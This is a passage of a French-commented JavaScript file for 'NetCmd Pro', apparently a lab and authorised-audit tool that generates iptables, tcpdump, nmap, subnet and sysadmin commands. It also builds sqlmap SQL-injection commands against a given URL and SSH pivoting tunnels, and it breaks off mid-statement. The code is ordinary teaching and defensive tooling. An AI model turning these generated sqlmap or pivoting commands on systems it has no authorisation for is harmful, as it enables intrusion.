/* =========================================================================
 * NetCmd Pro - Générateur de commandes réseau & sysadmin
 * Outil pédagogique (labs HackTheBox/TryHackMe, audits autorisés).
 * ========================================================================= */
document.addEventListener('DOMContentLoaded', () => {

    'use strict';

    const $ = (id) => document.getElementById(id);

    // =========================================================================
    // 0. UTILITAIRES (COPIE & TOAST)
    // =========================================================================

    let toastTimeout;
    function showToast(message) {
        let toast = $('toast-notification');
        if (!toast) {
            toast = document.createElement('div');
            toast.id = 'toast-notification';
            toast.className = 'toast';
            document.body.appendChild(toast);
        }
        toast.textContent = message || 'Copié !';
        toast.classList.add('show');
        if (toastTimeout) clearTimeout(toastTimeout);
        toastTimeout = setTimeout(() => toast.classList.remove('show'), 3000);
    }

    function copyText(text) {
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(text)
                .then(() => showToast('Copié dans le presse-papiers !'))
                .catch(() => fallbackCopy(text));
        } else {
            fallbackCopy(text);
        }
    }

    function fallbackCopy(text) {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.select();
        try { document.execCommand('copy'); showToast('Copié !'); }
        catch (e) { showToast('Copie impossible'); }
        document.body.removeChild(ta);
    }

    // Copie le texte brut d'un élément (par ID) — utilisée par les onclick inline
    window.copyTextFromElement = function (elementId) {
        const el = $(elementId);
        if (!el) return;
        copyText((el.innerText || el.textContent).trim());
    };
    // Alias historique
    window.copyOutput = function (id) { window.copyTextFromElement(id); };

    function escapeHtml(str) {
        return String(str).replace(/[&<>"']/g, (c) => (
            { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]
        ));
    }

    // =========================================================================
    // 1. NAVIGATION ENTRE MODULES
    // =========================================================================

    const moduleKeys = ['firewall', 'pivoting', 'traffic', 'scan', 'subnet',
        'webaudit', 'revshell', 'encoder', 'library', 'favorites', 'cheatsheet'];
    const modules = {};
    moduleKeys.forEach(k => { modules[k] = $('module-' + k); });

    const statusText = $('status-text');
    const prettyNames = {
        firewall: 'Pare-feu', pivoting: 'Pivoting', traffic: 'Trafic', scan: 'Scan',
        subnet: 'Calculateur IP', webaudit: 'Sécurité Web', revshell: 'Reverse Shells',
        encoder: 'Encodeur', library: 'Bibliothèque', favorites: 'Favoris', cheatsheet: 'Cheat-sheet'
    };

    function updateSidebarStyle(activeModuleId) {
        document.querySelectorAll('[data-module]').forEach(link => {
            const modName = link.getAttribute('data-module');
            const icon = link.querySelector('iconify-icon');
            link.className = 'flex items-center gap-2.5 px-2 py-1.5 text-sm text-zinc-400 hover:text-zinc-100 hover:bg-zinc-900/60 rounded transition-all cursor-pointer';
            if (icon) icon.className = 'transition-colors';
            if (modName === activeModuleId) {
                link.className = 'flex items-center gap-2.5 px-2 py-1.5 text-sm text-white bg-zinc-800/60 rounded border border-zinc-700/50 shadow-sm transition-all cursor-default';
                if (icon) icon.className = 'text-accent-500';
            }
        });
    }

    function showModule(modKey) {
        if (!modules[modKey]) modKey = 'firewall';
        Object.values(modules).forEach(el => { if (el) el.classList.add('hidden'); });
        if (modules[modKey]) modules[modKey].classList.remove('hidden');

        updateSidebarStyle(modKey);
        if (statusText) statusText.textContent = 'Module : ' + (prettyNames[modKey] || modKey);

        if (modKey === 'library') triggerCmdSearch();
        if (modKey === 'favorites') renderFavorites();
        if (modKey === 'firewall') updateFirewallCommand();
        if (modKey === 'cheatsheet') renderCheatsheet();
    }

    document.querySelectorAll('[data-module]').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            showModule(link.getAttribute('data-module'));
        });
    });

    // Recherche globale (bouton + ⌘K / Ctrl+K) -> ouvre la bibliothèque
    const searchButton = $('search-button');
    if (searchButton) {
        searchButton.addEventListener('click', () => {
            showModule('library');
            const q = $('cmdlib-query');
            if (q) q.focus();
        });
    }
    document.addEventListener('keydown', (e) => {
        if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === 'k') {
            e.preventDefault();
            showModule('library');
            const q = $('cmdlib-query');
            if (q) q.focus();
        }
    });

    // =========================================================================
    // 2. PARE-FEU (IPTABLES)
    // =========================================================================

    const chainSelect = $('chain-select');
    const protocolSelect = $('protocol-select');
    const sourceInput = $('source-input');
    const ifaceInput = $('iface-input');
    const portsInput = $('input-ports');
    const stateCheckboxes = document.querySelectorAll('input[data-state]');

    function updateFirewallCommand() {
        const out = $('code-output');
        if (!chainSelect || !out) return;

        const chain = chainSelect.value;
        const protocol = protocolSelect.value;
        const ip = sourceInput.value.trim();
        const iface = ifaceInput.value.trim();
        const ports = portsInput.value.trim();
        const action = ($('input-action') && $('input-action').value) || 'ACCEPT';

        const states = Array.from(stateCheckboxes)
            .filter(c => c.checked)
            .map(c => c.getAttribute('data-state'));

        let html = '<div class="text-zinc-500 select-none mb-2"># Généré par NetCmd Pro</div>';
        html += '<div class="leading-7 break-all"><span class="text-purple-400">iptables</span> ';
        html += '<span class="text-zinc-300">-A ' + chain + '</span>';

        if (iface) {
            const flag = (chain === 'OUTPUT') ? '-o' : '-i';
            html += ' <span class="text-zinc-300">' + flag + ' ' + escapeHtml(iface) + '</span>';
        }
        if (ip) html += ' <span class="text-zinc-300">-s <span class="text-blue-300">' + escapeHtml(ip) + '</span></span>';
        if (protocol && protocol !== 'all') html += ' <span class="text-zinc-300">-p ' + protocol + '</span>';

        if (ports && protocol !== 'icmp' && protocol !== 'all') {
            const multi = /[,]/.test(ports);
            if (multi) {
                html += ' <span class="text-zinc-300">-m multiport --dports <span class="text-amber-300">' + escapeHtml(ports) + '</span></span>';
            } else {
                html += ' <span class="text-zinc-300">--dport <span class="text-amber-300">' + escapeHtml(ports) + '</span></span>';
            }
        }

        if (states.length) {
            html += ' <span class="text-zinc-300">-m conntrack --ctstate <span class="text-cyan-300">' + states.join(',') + '</span></span>';
        }

        const actionColor = action === 'ACCEPT' ? 'text-emerald-400' : 'text-red-400';
        html += ' <span class="text-zinc-300">-j </span><span class="' + actionColor + '">' + action + '</span></div>';

        out.innerHTML = html;
    }

    window.setAction = function (action) {
        const hidden = $('input-action');
        if (hidden) hidden.value = action;
        document.querySelectorAll('[data-action-value]').forEach(btn => {
            const val = btn.getAttribute('data-action-value');
            btn.classList.remove('bg-emerald-500/10', 'text-emerald-400', 'border-emerald-500/20',
                'bg-red-500/10', 'text-red-400', 'border-red-500/20', 'text-zinc-500');
            if (val === action) {
                if (action === 'ACCEPT') btn.classList.add('bg-emerald-500/10', 'text-emerald-400', 'border-emerald-500/20');
                else btn.classList.add('bg-red-500/10', 'text-red-400', 'border-red-500/20');
            } else {
                btn.classList.add('text-zinc-500');
            }
        });
        updateFirewallCommand();
    };

    [chainSelect, protocolSelect, sourceInput, ifaceInput, portsInput].forEach(el => {
        if (el) el.addEventListener('input', updateFirewallCommand);
    });
    stateCheckboxes.forEach(c => c.addEventListener('change', updateFirewallCommand));

    // =========================================================================
    // 3. TRAFIC (TCPDUMP)
    // =========================================================================

    const trafficBuildBtn = $('traffic-build');
    if (trafficBuildBtn) {
        trafficBuildBtn.addEventListener('click', () => {
            const iface = ($('traffic-iface').value || 'eth0').trim();
            const filter = ($('traffic-filter').value || '').trim();
            const mode = $('traffic-mode') ? $('traffic-mode').value : 'live';
            const file = ($('traffic-file').value || 'capture.pcap').trim();
            const out = $('traffic-output');
            if (!out) return;

            let cmd = 'tcpdump -i ' + iface + ' -nn';
            if (mode === 'pcap') cmd += ' -w ' + file;
            if (filter) cmd += ' ' + filter;
            out.textContent = cmd;
        });
    }

    // =========================================================================
    // 4. SCAN (NMAP)
    // =========================================================================

    const scanBuildBtn = $('scan-build');
    if (scanBuildBtn) {
        scanBuildBtn.addEventListener('click', () => {
            const target = ($('scan-target').value || '127.0.0.1').trim();
            const profile = ($('scan-profile') && $('scan-profile').value) || '';
            const ports = ($('scan-ports').value || '').trim();
            const extra = ($('scan-extra') && $('scan-extra').value || '').trim();
            const out = $('scan-output');

            let cmd = 'nmap';
            if (profile) cmd += ' ' + profile;
            if (ports) cmd += ' -p ' + ports;
            if (extra) cmd += ' ' + extra;
            cmd += ' ' + target;
            if (out) out.textContent = cmd;
        });
    }

    // =========================================================================
    // 5. CALCULATEUR IP (SOUS-RÉSEAUX)
    // =========================================================================

    function ipToInt(ip) {
        return ip.split('.').reduce((res, octet) => (res << 8) + parseInt(octet, 10), 0) >>> 0;
    }
    function intToIp(int) {
        return [(int >>> 24) & 0xFF, (int >>> 16) & 0xFF, (int >>> 8) & 0xFF, int & 0xFF].join('.');
    }
    function getIpClass(firstOctet) {
        if (firstOctet >= 1 && firstOctet <= 126) return 'Classe A';
        if (firstOctet >= 128 && firstOctet <= 191) return 'Classe B';
        if (firstOctet >= 192 && firstOctet <= 223) return 'Classe C';
        if (firstOctet >= 224 && firstOctet <= 239) return 'Classe D (Multicast)';
        return 'Classe E / Réservé';
    }
    function isValidIp(ip) {
        const parts = ip.split('.');
        if (parts.length !== 4) return false;
        return parts.every(p => /^\d+$/.test(p) && +p >= 0 && +p <= 255);
    }

    const btnCalcSubnet = $('btn-calc-subnet');
    if (btnCalcSubnet) {
        btnCalcSubnet.addEventListener('click', (e) => {
            e.preventDefault();
            const ipVal = ($('subnet-ip').value || '192.168.1.1').trim();
            const cidr = parseInt($('subnet-mask').value, 10);
            const results = $('subnet-results');
            if (!results) return;

            if (!isValidIp(ipVal)) {
                results.innerHTML = '<p class="text-red-400">Adresse IPv4 invalide : « ' + escapeHtml(ipVal) + ' »</p>';
                return;
            }

            const ipInt = ipToInt(ipVal);
            const maskInt = cidr === 0 ? 0 : (0xFFFFFFFF << (32 - cidr)) >>> 0;
            const invMaskInt = (~maskInt) >>> 0;
            const netInt = (ipInt & maskInt) >>> 0;
            const broadcastInt = (netInt | invMaskInt) >>> 0;

            let firstHost, lastHost, count;
            if (cidr >= 31) { firstHost = netInt; lastHost = broadcastInt; count = (cidr === 31) ? 2 : 1; }
            else { firstHost = netInt + 1; lastHost = broadcastInt - 1; count = (broadcastInt - netInt - 1); }

            const firstOctet = parseInt(ipVal.split('.')[0], 10);
            const ipClass = getIpClass(firstOctet);
            const binStr = ipInt.toString(2).padStart(32, '0');
            const netBin = binStr.substring(0, cidr);
            const hostBin = binStr.substring(cidr);

            function row(label, value) {
                return '<div class="flex justify-between items-center border-b border-zinc-800/60 pb-2">' +
                    '<span class="text-zinc-400 text-sm">' + label + '</span>' +
                    '<span class="text-zinc-200 font-mono text-sm">' + value + '</span></div>';
            }

            results.innerHTML =
                '<div class="w-full h-full flex flex-col text-left">' +
                    '<div class="grid grid-cols-2 gap-6 mb-8">' +
                        '<div class="bg-zinc-900/40 p-4 rounded-lg border border-zinc-800">' +
                            '<div class="text-[10px] text-zinc-500 uppercase font-bold tracking-wider mb-1">Adresse Réseau</div>' +
                            '<div class="text-xl font-mono text-emerald-400">' + intToIp(netInt) + '</div>' +
                            '<div class="text-xs text-zinc-600 mt-1">' + ipClass + '</div>' +
                        '</div>' +
                        '<div class="bg-zinc-900/40 p-4 rounded-lg border border-zinc-800">' +
                            '<div class="text-[10px] text-zinc-500 uppercase font-bold tracking-wider mb-1">Broadcast</div>' +
                            '<div class="text-xl font-mono text-purple-400">' + intToIp(broadcastInt) + '</div>' +
                            '<div class="text-xs text-zinc-600 mt-1">Dernière adresse</div>' +
                        '</div>' +
                    '</div>' +
                    '<div class="space-y-4 mb-8">' +
                        row('Premier hôte utilisable', intToIp(firstHost)) +
                        row('Dernier hôte utilisable', intToIp(lastHost)) +
                        row('Masque de sous-réseau', intToIp(maskInt)) +
                        row('Masque générique (wildcard)', intToIp(invMaskInt)) +
                        '<div class="flex justify-between items-center border-b border-zinc-800/60 pb-2">' +
                            '<span class="text-zinc-400 text-sm">Nombre d\'hôtes utilisables</span>' +
                            '<span class="text-white bg-accent-600/20 text-accent-400 px-2 py-0.5 rounded text-xs font-bold">' + count.toLocaleString('fr-FR') + '</span>' +
                        '</div>' +
                    '</div>' +
                    '<div class="mt-auto bg-black/20 rounded-lg p-4 border border-zinc-800">' +
                        '<div class="flex items-center justify-between mb-3">' +
                            '<span class="text-[10px] text-zinc-500 uppercase font-bold">Visualisation Binaire</span>' +
                            '<span class="text-[10px] text-zinc-600">/' + cidr + '</span>' +
                        '</div>' +
                        '<div class="font-mono text-xs break-all tracking-wider leading-relaxed">' +
                            '<span class="text-accent-400 border-b-2 border-accent-500/50 pb-0.5" title="Partie Réseau">' + netBin + '</span>' +
                            '<span class="text-zinc-500 border-b-2 border-zinc-700/50 pb-0.5" title="Partie Hôte">' + hostBin + '</span>' +
                        '</div>' +
                        '<div class="flex gap-4 mt-3 text-[10px]">' +
                            '<div class="flex items-center gap-1.5"><div class="w-2 h-2 rounded-full bg-accent-500"></div><span class="text-zinc-400">Bits Réseau</span></div>' +
                            '<div class="flex items-center gap-1.5"><div class="w-2 h-2 rounded-full bg-zinc-600"></div><span class="text-zinc-400">Bits Hôte</span></div>' +
                        '</div>' +
                    '</div>' +
                '</div>';
        });
    }

    // =========================================================================
    // 6. FAVORIS (localStorage)
    // =========================================================================

    const FAV_KEY = 'netcmd_favorites';

    function loadFavorites() {
        try { return JSON.parse(localStorage.getItem(FAV_KEY)) || []; }
        catch (e) { return []; }
    }
    function saveFavorites(list) {
        try { localStorage.setItem(FAV_KEY, JSON.stringify(list)); } catch (e) {}
    }
    function isFavorite(cmd) {
        return loadFavorites().some(f => f.cmd === cmd);
    }
    function toggleFavorite(fav) {
        let list = loadFavorites();
        const idx = list.findIndex(f => f.cmd === fav.cmd);
        if (idx >= 0) { list.splice(idx, 1); showToast('Retiré des favoris'); }
        else { list.push(fav); showToast('Ajouté aux favoris ★'); }
        saveFavorites(list);
        if (modules.favorites && !modules.favorites.classList.contains('hidden')) renderFavorites();
    }

    const favResults = $('fav-results');
    const favOsHidden = $('fav-os');
    const favOsButtons = document.querySelectorAll('.fav-os');

    favOsButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            const os = btn.getAttribute('data-os') || 'windows';
            if (favOsHidden) favOsHidden.value = os;
            favOsButtons.forEach(b => {
                b.classList.remove('bg-accent-600', 'text-white');
                b.classList.add('text-zinc-300', 'hover:bg-zinc-800');
            });
            btn.classList.remove('text-zinc-300', 'hover:bg-zinc-800');
            btn.classList.add('bg-accent-600', 'text-white');
            renderFavorites();
        });
    });

    function renderFavorites() {
        if (!favResults) return;
        const list = loadFavorites();
        const os = (favOsHidden && favOsHidden.value) || 'windows';
        const filtered = list.filter(f => !f.os || f.os === os || f.os === 'network' || f.os === 'cli' || f.os === 'all');

        let html = '<div class="flex items-center justify-between mb-3">' +
            '<span class="text-[11px] text-zinc-500">' + list.length + ' favori(s) enregistré(s)</span>' +
            '<div class="flex gap-2">' +
                '<button id="fav-export" class="text-[10px] px-2 py-1 rounded border border-zinc-700 text-zinc-300 hover:bg-zinc-800 transition-colors">Exporter .txt</button>' +
                '<button id="fav-clear" class="text-[10px] px-2 py-1 rounded border border-red-500/30 text-red-400 hover:bg-red-500/10 transition-colors">Tout vider</button>' +
            '</div></div>';

        if (!filtered.length) {
            html += '<p class="text-zinc-500 italic">Aucun favori pour cet OS. Ajoute des commandes depuis la Bibliothèque (icône ★).</p>';
        } else {
            filtered.forEach(fav => {
                const uid = 'fav-' + Math.random().toString(36).slice(2, 9);
                html += '<div class="border border-zinc-800 rounded-lg p-3 space-y-2 bg-zinc-950/60 mb-3">' +
                    '<div class="flex items-center justify-between">' +
                        '<div class="text-xs font-semibold text-zinc-100">' + escapeHtml(fav.title || 'Commande') + '</div>' +
                        '<button class="fav-remove text-amber-400 hover:text-red-400 transition-colors" data-cmd="' + escapeHtml(fav.cmd) + '" title="Retirer"><iconify-icon icon="lucide:star" width="14"></iconify-icon></button>' +
                    '</div>' +
                    '<pre id="' + uid + '" class="bg-zinc-900 border border-zinc-800 rounded px-2 py-1.5 text-[11px] text-zinc-100 overflow-x-auto font-mono cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'' + uid + '\')">' + escapeHtml(fav.cmd) + '</pre>' +
                '</div>';
            });
        }
        favResults.innerHTML = html;

        const exportBtn = $('fav-export');
        if (exportBtn) exportBtn.addEventListener('click', exportFavorites);
        const clearBtn = $('fav-clear');
        if (clearBtn) clearBtn.addEventListener('click', () => {
            if (confirm('Supprimer tous les favoris ?')) { saveFavorites([]); renderFavorites(); }
        });
        favResults.querySelectorAll('.fav-remove').forEach(btn => {
            btn.addEventListener('click', () => toggleFavorite({ cmd: btn.getAttribute('data-cmd') }));
        });
    }

    function exportFavorites() {
        const list = loadFavorites();
        if (!list.length) { showToast('Aucun favori à exporter'); return; }
        const text = list.map(f => '# ' + (f.title || 'Commande') + ' [' + (f.os || 'cli') + ']\n' + f.cmd).join('\n\n');
        const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'netcmd-favoris.txt';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        showToast('Favoris exportés');
    }

    // =========================================================================
    // 7. BIBLIOTHÈQUE DE COMMANDES
    // =========================================================================

    const cmdlibOsHidden = $('cmdlib-os');
    const cmdlibOsButtons = document.querySelectorAll('.cmdlib-os');
    const cmdlibSearchBtn = $('cmdlib-search');
    const cmdlibQueryInput = $('cmdlib-query');
    const cmdlibResults = $('cmdlib-results');

    const commandLibrary = [
        {
            id: 'huawei-switch-basic', keywords: ['huawei', 'switch', 'configurer', 'vlan'],
            title: 'Configuration basique switch Huawei', os: 'network',
            steps: [
                { cmd: 'system-view', desc: 'Mode config' },
                { cmd: 'vlan 10', desc: 'Créer VLAN 10' },
                { cmd: 'interface GigabitEthernet 0/0/1', desc: 'Aller dans l\'interface' },
                { cmd: 'port link-type access', desc: 'Mode access' },
                { cmd: 'port default vlan 10', desc: 'Assigner le VLAN' }
            ]
        },
        {
            id: 'cisco-switch-basic', keywords: ['cisco', 'switch', 'vlan', 'configurer'],
            title: 'Configuration basique switch Cisco', os: 'network',
            steps: [
                { cmd: 'enable', desc: 'Mode privilégié' },
                { cmd: 'configure terminal', desc: 'Mode configuration' },
                { cmd: 'vlan 10', desc: 'Créer VLAN 10' },
                { cmd: 'interface GigabitEthernet0/1', desc: 'Sélectionner l\'interface' },
                { cmd: 'switchport mode access', desc: 'Mode access' },
                { cmd: 'switchport access vlan 10', desc: 'Assigner le VLAN' }
            ]
        },
        {
            id: 'ip-config', keywords: ['ip', 'adresse', 'configurer', 'reseau', 'network'],
            title: 'Voir l\'adresse IP', os: 'multi',
            perOs: {
                windows: [{ cmd: 'ipconfig /all', desc: 'Détails complets des cartes réseau.' }],
                macos: [{ cmd: 'ifconfig', desc: 'Lister les interfaces.' }, { cmd: 'ipconfig getifaddr en0', desc: 'IP de l\'interface Wi-Fi.' }],
                linux: [{ cmd: 'ip addr show', desc: 'Voir les adresses IP.' }]
            }
        },
        {
            id: 'install-package', keywords: ['installer', 'install', 'programme', 'logiciel', 'gedit', 'git', 'vlc', 'paquet'],
            title: 'Installer un logiciel', os: 'multi',
            perOs: {
                windows: [{ cmd: 'winget install <nom>', desc: 'Via Winget.' }],
                macos: [{ cmd: 'brew install <nom>', desc: 'Via Homebrew.' }],
                linux: [{ cmd: 'sudo apt install <nom>', desc: 'Debian/Ubuntu.' }]
            }
        },
        {
            id: 'flush-dns', keywords: ['dns', 'cache', 'vider', 'flush'],
            title: 'Vider le cache DNS', os: 'multi',
            perOs: {
                windows: [{ cmd: 'ipconfig /flushdns', desc: 'Vider le cache.' }],
                macos: [{ cmd: 'sudo killall -HUP mDNSResponder', desc: 'macOS récent.' }],
                linux: [{ cmd: 'sudo systemd-resolve --flush-caches', desc: 'Systemd.' }]
            }
        },
        {
            id: 'check-disk', keywords: ['disque', 'espace', 'stockage', 'disk'],
            title: 'Vérifier l\'espace disque', os: 'multi',
            perOs: {
                windows: [{ cmd: 'wmic logicaldisk get size,freespace,caption', desc: 'Via WMIC.' }],
                macos: [{ cmd: 'df -h', desc: 'Format lisible.' }],
                linux: [{ cmd: 'df -h', desc: 'Format lisible.' }]
            }
        },
        {
            id: 'ping-test', keywords: ['ping', 'test', 'connexion'],
            title: 'Tester la connexion (Ping)', os: 'multi',
            perOs: {
                windows: [{ cmd: 'ping google.com', desc: '4 paquets par défaut.' }],
                macos: [{ cmd: 'ping -c 4 google.com', desc: 'Limiter à 4 paquets.' }],
                linux: [{ cmd: 'ping -c 4 google.com', desc: 'Limiter à 4 paquets.' }]
            }
        },
        {
            id: 'ports-listen', keywords: ['port', 'ecoute', 'listen', 'netstat', 'ouvert'],
            title: 'Lister les ports en écoute', os: 'multi',
            perOs: {
                windows: [{ cmd: 'netstat -ano | findstr LISTENING', desc: 'Ports + PID.' }],
                macos: [{ cmd: 'lsof -i -P | grep LISTEN', desc: 'Ports en écoute.' }],
                linux: [{ cmd: 'ss -tulpn', desc: 'Sockets TCP/UDP en écoute.' }]
            }
        },
        {
            id: 'kill-process', keywords: ['tuer', 'kill', 'processus', 'process', 'arreter'],
            title: 'Tuer un processus', os: 'multi',
            perOs: {
                windows: [{ cmd: 'taskkill /PID <pid> /F', desc: 'Forcer l\'arrêt.' }],
                macos: [{ cmd: 'kill -9 <pid>', desc: 'Signal KILL.' }],
                linux: [{ cmd: 'kill -9 <pid>', desc: 'Signal KILL.' }]
            }
        },
        {
            id: 'route-table', keywords: ['route', 'passerelle', 'gateway', 'table'],
            title: 'Voir la table de routage', os: 'multi',
            perOs: {
                windows: [{ cmd: 'route print', desc: 'Table complète.' }],
                macos: [{ cmd: 'netstat -rn', desc: 'Table de routage.' }],
                linux: [{ cmd: 'ip route', desc: 'Table de routage.' }]
            }
        }
    ];

    cmdlibOsButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            const os = btn.getAttribute('data-os') || 'windows';
            if (cmdlibOsHidden) cmdlibOsHidden.value = os;
            cmdlibOsButtons.forEach(b => {
                b.classList.remove('bg-accent-600', 'text-white');
                b.classList.add('text-zinc-300', 'hover:bg-zinc-800');
            });
            btn.classList.remove('text-zinc-300', 'hover:bg-zinc-800');
            btn.classList.add('bg-accent-600', 'text-white');
            if (cmdlibQueryInput && cmdlibQueryInput.value.trim() !== '') triggerCmdSearch();
        });
    });

    function searchCommandLibrary(query) {
        const q = (query || '').toLowerCase().trim();
        if (!q) return [];
        const words = q.split(/\s+/).filter(Boolean);
        return commandLibrary.filter(item => {
            const hay = item.keywords.join(' ').toLowerCase() + ' ' + item.title.toLowerCase();
            return words.some(w => hay.includes(w));
        });
    }

    function renderCommandResults(items, os, container) {
        if (!container) return;
        if (!items || items.length === 0) {
            const query = cmdlibQueryInput ? cmdlibQueryInput.value.trim() : '';
            container.innerHTML = query === ''
                ? '<p class="text-zinc-500 italic">Entrez un mot-clé (ex: « installer », « dns ») et validez.</p>'
                : '<p class="text-zinc-500 italic">Aucun résultat pour « ' + escapeHtml(query) + ' ».</p>';
            return;
        }

        let html = '';
        items.forEach(item => {
            html += '<div class="border border-zinc-800 rounded-lg p-3 space-y-2 bg-zinc-950/60 hover:border-zinc-700 transition-colors">';
            html += '<div class="flex items-center justify-between"><div class="text-xs font-semibold text-zinc-100">' + escapeHtml(item.title) + '</div>' +
                '<div class="text-[10px] text-zinc-600 border border-zinc-800 px-1 rounded uppercase">' + (item.os === 'multi' ? os : (item.os === 'network' ? 'NET' : 'CLI')) + '</div></div>';

            let steps = [];
            if (item.os === 'network') steps = item.steps || [];
            else if (item.os === 'multi' && item.perOs) steps = item.perOs[os] || [];

            if (!steps.length) {
                html += '<p class="text-[11px] text-zinc-500 italic">Aucune commande spécifique pour cet OS.</p>';
            } else {
                steps.forEach(step => {
                    const uid = 'cmd-' + Math.random().toString(36).slice(2, 9);
                    const favId = item.os === 'network' ? 'network' : os;
                    const fav = isFavorite(step.cmd);
                    html += '<div class="flex items-center gap-2">' +
                        '<pre id="' + uid + '" class="flex-1 bg-zinc-900 border border-zinc-800 rounded px-2 py-1.5 text-[11px] text-zinc-100 overflow-x-auto font-mono cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'' + uid + '\')">' + escapeHtml(step.cmd) + '</pre>' +
                        '<button class="lib-fav shrink-0 ' + (fav ? 'text-amber-400' : 'text-zinc-600 hover:text-amber-400') + ' transition-colors" ' +
                            'data-cmd="' + escapeHtml(step.cmd) + '" data-title="' + escapeHtml(item.title) + '" data-os="' + favId + '" title="Ajouter aux favoris">' +
                            '<iconify-icon icon="lucide:star" width="15"></iconify-icon></button>' +
                    '</div>';
                    html += '<p class="text-[10px] text-zinc-500 mb-1 ml-1">' + escapeHtml(step.desc) + '</p>';
                });
            }
            html += '</div>';
        });
        container.innerHTML = html;

        container.querySelectorAll('.lib-fav').forEach(btn => {
            btn.addEventListener('click', () => {
                toggleFavorite({
                    cmd: btn.getAttribute('data-cmd'),
                    title: btn.getAttribute('data-title'),
                    os: btn.getAttribute('data-os')
                });
                const nowFav = isFavorite(btn.getAttribute('data-cmd'));
                btn.className = 'lib-fav shrink-0 ' + (nowFav ? 'text-amber-400' : 'text-zinc-600 hover:text-amber-400') + ' transition-colors';
            });
        });
    }

    function triggerCmdSearch() {
        if (!cmdlibQueryInput || !cmdlibOsHidden) return;
        const items = searchCommandLibrary(cmdlibQueryInput.value);
        renderCommandResults(items, cmdlibOsHidden.value || 'windows', cmdlibResults);
    }

    if (cmdlibSearchBtn) cmdlibSearchBtn.addEventListener('click', triggerCmdSearch);
    if (cmdlibQueryInput) {
        cmdlibQueryInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') { e.preventDefault(); triggerCmdSearch(); }
        });
    }
    if (cmdlibResults) {
        cmdlibResults.innerHTML = '<p class="text-zinc-500 italic">Sélectionnez un système et tapez une recherche...</p>';
    }

    // =========================================================================
    // 8. SÉCURITÉ WEB (ANALYSE URL + SQLMAP)
    // =========================================================================

    function cleanUrlForDomain(url) {
        let domain = url.replace(/^(?:https?:\/\/)?(?:www\.)?/i, '');
        return domain.split('/')[0];
    }

    const urlBuildBtn = $('url-build-cmd');
    if (urlBuildBtn) {
        urlBuildBtn.addEventListener('click', () => {
            const rawUrl = ($('url-target').value || 'exemple.com').trim();
            const domain = cleanUrlForDomain(rawUrl);
            const fullUrl = rawUrl.startsWith('http') ? rawUrl : 'https://' + rawUrl;
            const out = $('webaudit-output');
            if (!out) return;
            function block(label, id, cmd) {
                return '<div><div class="text-blue-500 text-[10px] uppercase font-bold tracking-widest mb-1">' + label + ' :</div>' +
                    '<pre class="bg-zinc-900 p-2 rounded border border-zinc-800 text-zinc-200 cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'' + id + '\')"><code id="' + id + '">' + cmd + '</code></pre></div>';
            }
            out.innerHTML =
                '<div class="space-y-4">' +
                    block('1. En-têtes HTTP (serveur, sécurité)', 'cmd-curl', 'curl -I -L "' + escapeHtml(fullUrl) + '"') +
                    block('2. Enregistrement (propriétaire / WHOIS)', 'cmd-whois', 'whois ' + escapeHtml(domain)) +
                    block('3. Résolution DNS', 'cmd-nslookup', 'nslookup ' + escapeHtml(domain)) +
                '</div>';
        });
    }

    const urlVtBtn = $('url-virustotal');
    if (urlVtBtn) {
        urlVtBtn.addEventListener('click', () => {
            const rawUrl = ($('url-target').value || 'exemple.com').trim();
            const domain = cleanUrlForDomain(rawUrl);
            window.open('https://www.virustotal.com/gui/domain/' + encodeURIComponent(domain) + '/detection', '_blank');
        });
    }

    const sqlBuildBtn = $('sql-build');
    if (sqlBuildBtn) {
        sqlBuildBtn.addEventListener('click', () => {
            const url = ($('sql-url').value || 'http://example.com/page.php?id=1').trim();
            const action = $('sql-action').value;
            const risk = $('sql-risk').value;
            const batch = $('sql-batch').checked ? '--batch ' : '';
            const out = $('webaudit-output');
            const fullCmd = 'sqlmap -u "' + url + '" ' + action + ' ' + risk + ' ' + batch + '--random-agent';
            if (!out) return;
            out.innerHTML =
                '<div class="space-y-2">' +
                    '<div class="text-orange-500 text-[10px] uppercase font-bold tracking-widest">Commande sqlmap générée :</div>' +
                    '<pre class="bg-zinc-900 p-3 rounded border border-zinc-800 text-zinc-200 whitespace-pre-wrap break-all cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'sql-cmd-text\')"><code id="sql-cmd-text">' + escapeHtml(fullCmd) + '</code></pre>' +
                    '<div class="text-zinc-500 text-[10px]">⚠ Uniquement sur une cible dont tu as l\'autorisation explicite.</div>' +
                '</div>';
        });
    }

    // =========================================================================
    // 9. PIVOTING & TUNNELS SSH
    // =========================================================================

    const pivotTypeSelect = $('pivot-type');
    const targetBlock = $('target-block');
    const btnBuildPivot = $('btn-build-pivot');

    if (pivotTypeSelect && targetBlock) {
        pivotTypeSelect.addEventListener('change', (e) => {
            targetBlock.classList.toggle('opacity-50', e.target.value === 'dynamic');
            targetBlock.classList.toggle('pointer-events-none', e.target.value === 'dynamic');
        });
        targetBlock.classList.add('opacity-50', 'pointer-events-none');
    }

    if (btnBuildPivot) {
        btnBuildPivot.addEventListener('click', () => {
            const type = $('pivot-type').value;
            const pUser = ($('pivot-user').value || 'user').trim();
            const pIp = ($('pivot-ip').value || '10.10.10.5').trim();
            const tIp = ($('target-ip').value || '192.168.1.100').trim();
            const tPort = ($('target-port').value || '80').trim();
            const lPort = ($('local-port').value || (type === 'dynamic' ? '1080' : '8080')).trim();
            const outCmd = $('pivot-cmd-output');
            const outInst = $('pivot-instructions');

            let cmd = '', instructions = '';
            if (type === 'dynamic') {
                cmd = 'ssh -D ' + lPort + ' -N -q ' + pUser + '@' + pIp;
                instructions =
